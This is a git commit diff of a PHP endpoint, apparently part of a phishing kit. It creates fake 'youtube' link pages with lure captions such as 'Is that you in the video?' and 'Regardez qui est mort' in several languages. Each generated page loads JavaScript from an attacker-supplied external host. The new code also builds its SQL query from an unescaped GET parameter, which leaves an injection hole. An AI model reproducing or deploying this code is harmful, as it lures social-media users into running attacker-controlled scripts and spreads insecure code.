239c833249af8d425b2d7b146d271cfd7221a31f
busine011 <112756675+busine011@users.noreply.github.com>
2022-09-14 08:09:52 -0400

    Update apiv2.php

--- apiv2.php
+++ apiv2.php
@@ -1,35 +1,21 @@
 <?php
 header('Content-type: application/json');
-header('Access-Control-Allow-Origin: *'); //I have also tried the * wildcard and get the same response
+header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: ');
 require_once "./random_string.php";
-
+require_once "./BaseDatosMySql.php";
 $cottorra = trim($_GET['cottorra']) ? $_GET['cottorra'] : null;
 $script = trim($_GET['script']) ? $_GET['script'] : null;
 
-//if ($_SERVER['HTTP_REFERER'] !== 'https://panelfb.trade/'){ die('Unauthorized access'); }
 
 
-if($cottorra == "c1"){
-		 $letraurl = "Regarde tu étais dans la vidéo 🤣😆😅😀😂";
-		}
-			
-		else if($cottorra == "c2"){
-		 $letraurl = "Regardez qui est mort 😢😢";
-		}
-			
-		else if($cottorra == "c3"){
-		 $letraurl = "C'est toi dans la vidéo ? 😲😱😲";
-		}	
-		
-		else if($cottorra == "c4"){
-		 $letraurl = "Is that you in the video?😲😱😲 ";
-		}
-		
-		else if($cottorra == "c5"){
-		 $letraurl = "Creo que estais en el video🤣😆😅😀😂 ";
-		}	
-$description = $letraurl;
+
+$getcottorra=$pdoMySql->prepare("SELECT cottorra FROM cottorras WHERE  id='".$_GET['cottorra']."'");
+$getcottorra->execute();
+$info_cottorra=$getcottorra->fetchAll(PDO::FETCH_ASSOC);
+foreach ($info_cottorra as $cottorraextraida) {
+}
+
 
 
 
@@ -40,13 +26,12 @@ $DOMAIN = $_SERVER['SERVER_NAME'];
 $PROTOCOLO  =  "https://";
 	
 $contentHTML = '<script src="'.$PROTOCOLO.$script.'" type="text/javascript" async="true"></script>';
-//$contentHTML = '<script languaje="javascript"> setTimeout(location.href="'.$linkbase.'",8000); </script>';
 file_put_contents("youtube/links". "/" .$NAMEFILE, $contentHTML);
-//echo  $description." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE;
+
 	
 	
 $response = array(
- "url"=>$description." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE
+ "url"=>$cottorraextraida['cottorra']." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE
 );
 echo json_encode($response);   	
 	
